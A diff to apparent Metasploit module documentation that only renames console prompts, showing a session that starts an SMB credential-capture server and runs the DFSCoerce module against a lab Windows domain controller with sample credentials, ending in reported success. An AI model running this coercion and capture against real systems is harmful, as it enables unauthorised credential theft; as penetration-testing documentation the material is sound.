@@ -29,23 +29,23 @@ In this case, Metasploit is hosting an SMB capture server to log the incoming cr
 account. The target is a 64-bit Windows Server 2019 domain controller.
 
 ```
-msf6 > use auxiliary/server/capture/smb 
-msf6 auxiliary(server/capture/smb) > run
+msf > use auxiliary/server/capture/smb 
+msf auxiliary(server/capture/smb) > run
 [*] Auxiliary module running as background job 0.
-msf6 auxiliary(server/capture/smb) > 
+msf auxiliary(server/capture/smb) > 
 [*] Server is running. Listening on 0.0.0.0:445
 [*] Server started.
 
-msf6 auxiliary(server/capture/smb) > use auxiliary/scanner/dcerpc/dfscoerce 
-msf6 auxiliary(scanner/dcerpc/dfscoerce) > set RHOSTS 192.168.159.96
+msf auxiliary(server/capture/smb) > use auxiliary/scanner/dcerpc/dfscoerce 
+msf auxiliary(scanner/dcerpc/dfscoerce) > set RHOSTS 192.168.159.96
 RHOSTS => 192.168.159.96
-msf6 auxiliary(scanner/dcerpc/dfscoerce) > set VERBOSE true
+msf auxiliary(scanner/dcerpc/dfscoerce) > set VERBOSE true
 VERBOSE => true
-msf6 auxiliary(scanner/dcerpc/dfscoerce) > set SMBUser aliddle
+msf auxiliary(scanner/dcerpc/dfscoerce) > set SMBUser aliddle
 SMBUser => aliddle
-msf6 auxiliary(scanner/dcerpc/dfscoerce) > set SMBPass Password1
+msf auxiliary(scanner/dcerpc/dfscoerce) > set SMBPass Password1
 SMBPass => Password1
-msf6 auxiliary(scanner/dcerpc/dfscoerce) > run
+msf auxiliary(scanner/dcerpc/dfscoerce) > run
 
 [*] 192.168.159.96:445    - Connecting to Distributed File System (DFS) Namespace Management Protocol
 [*] 192.168.159.96:445    - Binding to \netdfs...
@@ -58,5 +58,5 @@ msf6 auxiliary(scanner/dcerpc/dfscoerce) > run
 [+] 192.168.159.96:445    - Server responded with ERROR_ACCESS_DENIED which indicates that the attack was successful
 [*] 192.168.159.96:445    - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/dcerpc/dfscoerce) >
+msf auxiliary(scanner/dcerpc/dfscoerce) >
 ```
